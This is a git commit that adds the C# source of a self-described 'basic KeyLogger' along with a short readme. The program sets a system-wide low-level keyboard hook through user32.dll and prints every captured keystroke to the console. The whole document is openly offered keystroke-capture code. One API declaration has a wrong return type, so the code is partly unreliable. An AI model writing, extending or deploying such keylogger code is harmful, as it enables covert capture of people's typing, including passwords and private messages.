a0e0f429f5f2059121ef0c96a3cb70f12ef745a5
Kauan Oliveira <keyo.kb41@gmail.com>
2021-04-15 11:31:52 -0300

    sum

---
+++ KeyLogger/MyKeyLogger v1/Program.cs
@@ -0,0 +1,56 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Input;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Windows.Forms;
+using System.IO;
+
+namespace MyKeyLogger_v1
+{
+    class Program
+    {
+        private static int WH_KEYBOARD_LL = 13;
+        private static int WM_KEYDOWN = 0x100;
+        private static IntPtr hook = IntPtr.Zero;
+        private static LowLevelKeyboardProc llkProcedure = HookCallBack;
+        static void Main(string[] args)
+        {
+            hook = SetHook(llkProcedure);
+            Application.Run();
+            UnhookWindowsHookEx(hook);
+        }
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);    
+        private static IntPtr HookCallBack(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                string charmander = Encoding.ASCII.GetString(new byte[] { Convert.ToByte(vkCode) });
+                Console.Write(charmander);
+            }
+            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
+        }
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            Process currentProcess = Process.GetCurrentProcess();
+            ProcessModule currentModule = currentProcess.MainModule;
+            String moduleName = currentModule.ModuleName;
+            IntPtr modulehandle = GetModuleHandle(moduleName);
+            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, modulehandle, 0);
+        }
+        [DllImport("user32.dll")]
+        private static extern ExternalException UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, int dwThreadId);
+        
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetModuleHandle(String lpModuleName);
+    }
+}
---
+++ KeyLogger/readme.md
@@ -0,0 +1,4 @@
+#This is a basic KeyLogger..
+That uses a user32.dll to hook any hexadecimal code of any pressed key, 
+from the computer memory, the unhook and decode it with asc II table to 
+alphabetic.
